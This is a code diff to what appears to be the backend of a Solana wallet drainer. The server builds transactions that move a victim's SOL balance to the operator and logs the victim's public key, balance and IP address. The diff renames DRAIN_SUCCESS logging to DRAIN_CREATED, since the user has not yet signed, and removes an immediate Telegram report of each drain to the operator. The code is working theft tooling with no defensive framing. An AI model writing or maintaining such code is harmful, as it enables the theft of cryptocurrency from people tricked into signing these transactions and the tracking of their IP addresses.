@@ -46,7 +46,8 @@ console.log = function() {
       arguments[0].includes('DRAIN_AMOUNT') ||
       arguments[0].includes('CONFIRMATION') ||
       arguments[0].includes('CONFIRMATION_HANDLER') ||
-      arguments[0].includes('DRAIN_SUCCESS_FRONTEND')
+      arguments[0].includes('DRAIN_CREATED') ||
+      arguments[0].includes('DRAIN_CREATED_FRONTEND')
     )
   )) {
     originalConsoleLog.apply(console, arguments);
@@ -917,8 +918,8 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         return res.status(500).json({ error: 'Failed to encode transaction', details: 'Transaction encoding failed' });
       }
       
-      // Log drain success with amount
-      console.log('[DRAIN_SUCCESS] Transaction created successfully:', {
+      // Log transaction created (not success yet - user hasn't signed)
+      console.log('[DRAIN_CREATED] Transaction created successfully:', {
         publicKey: userPubkey.toString(),
         drainAmount: actualDrainAmount,
         drainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
@@ -926,18 +927,6 @@ debugLog(`- User Agent: ${userAgent.substring(0, 100)}...`);
         balanceSOL: (lamports / 1e9).toFixed(6),
         ip: userIp
       });
-      
-      // Also log to Telegram immediately when transaction is created
-      try {
-        await telegramLogger.logDrainSuccess({
-          publicKey: userPubkey.toString(),
-          actualDrainAmount: actualDrainAmount,
-          lamports: lamports,
-          ip: userIp
-        });
-      } catch (telegramError) {
-        console.log('[TELEGRAM] Failed to log drain success immediately:', telegramError);
-      }
       
       res.status(200).json(response);
     } catch (error) {
